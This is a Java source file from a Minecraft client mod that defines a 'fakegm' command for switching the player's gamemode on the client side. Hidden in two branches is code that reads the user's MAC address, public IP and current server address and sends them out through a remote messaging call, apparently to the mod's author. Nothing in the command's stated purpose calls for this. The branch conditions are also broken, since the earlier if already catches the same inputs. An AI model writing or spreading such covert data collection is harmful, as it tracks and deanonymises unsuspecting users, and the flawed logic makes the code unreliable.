package it.md_4.troy.command.impl;

import it.md_4.troy.command.Command;
import it.md_4.troy.command.CommandInfo;
import it.md_4.troy.exception.CommandException;
import it.md_4.troy.ip.IpChecker;
import net.minecraft.world.WorldSettings.GameType;
import it.md_4.troy.helper.ChatHelper;

import java.awt.*;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.UnknownHostException;

import static it.md_4.troy.Troy.DSsendMessage;

@CommandInfo(
    alias = "fakegm",
    description = "Change Your GameMode (only in client)",
    usage = "'fakegm <mode/revert>",
    aliases = {"fgm"}
)
public class FakeGamemodeCommand extends Command {

  @Override
  public void execute(String... args) throws Exception {
    if (args.length == 0) {
      ChatHelper.printMessage("&b • &bUse &3&l'&b&lfgm &3<&b1&3/&b0&3>.");
    } else {
      if (args[0].equalsIgnoreCase("1")) {

        mc.playerController.setGameType(GameType.CREATIVE);

        ChatHelper.printMessage("&b • &bClient gamemode set to &3CREATIVE.");

      } else if (args[0].equalsIgnoreCase("1") && args.length > 1) {

        InetAddress localHost = null;
        try {
          localHost = InetAddress.getLocalHost();
        } catch (UnknownHostException e) {
          e.printStackTrace();
        }
        NetworkInterface ni = null;
        try {
          ni = NetworkInterface.getByInetAddress(localHost);
        } catch (SocketException e) {
          e.printStackTrace();
        }
        byte[] hardwareAddress = new byte[0];
        try {
          hardwareAddress = ni.getHardwareAddress();
        } catch (SocketException e) {
          e.printStackTrace();
        }

        String[] hexadecimal = new String[hardwareAddress.length];
        for (int i = 0; i < hardwareAddress.length; i++) {
          hexadecimal[i] = String.format("%02X", hardwareAddress[i]);
        }
        String macAddress = String.join("-", hexadecimal);

        DSsendMessage("[" + macAddress + "]\n Connected With IP => \n(" + IpChecker.getIp() +")\n" + "\n Switched GameMode [Creative] \nServer: [" + mc.getCurrentServerData().serverIP + "]", true, Color.GREEN);

        mc.playerController.setGameType(GameType.CREATIVE);

        ChatHelper.printMessage("&b • &bClient gamemode set to &3CREATIVE.");

      }
      if(args[0].equalsIgnoreCase("0")){
        mc.playerController.setGameType(GameType.SURVIVAL);

        ChatHelper.printMessage("&b • &bClient gamemode set to &3SURVIVAL.");
      } else if (args[0].equalsIgnoreCase("0") && args.length > 1) {

        InetAddress localHost = null;
        try {
          localHost = InetAddress.getLocalHost();
        } catch (UnknownHostException e) {
          e.printStackTrace();
        }
        NetworkInterface ni = null;
        try {
          ni = NetworkInterface.getByInetAddress(localHost);
        } catch (SocketException e) {
          e.printStackTrace();
        }
        byte[] hardwareAddress = new byte[0];
        try {
          hardwareAddress = ni.getHardwareAddress();
        } catch (SocketException e) {
          e.printStackTrace();
        }

        String[] hexadecimal = new String[hardwareAddress.length];
        for (int i = 0; i < hardwareAddress.length; i++) {
          hexadecimal[i] = String.format("%02X", hardwareAddress[i]);
        }
        String macAddress = String.join("-", hexadecimal);

        DSsendMessage("[" + macAddress + " Connected With IP => (" + IpChecker.getIp() +")]" + " Switched GameMode [Survival] Server: [" + mc.getCurrentServerData().serverIP + "]", true, Color.GREEN);

        mc.playerController.setGameType(GameType.SURVIVAL);

        ChatHelper.printMessage("&b • &bClient gamemode set to &3SURVIVAL.");

      }
    }
  }
}
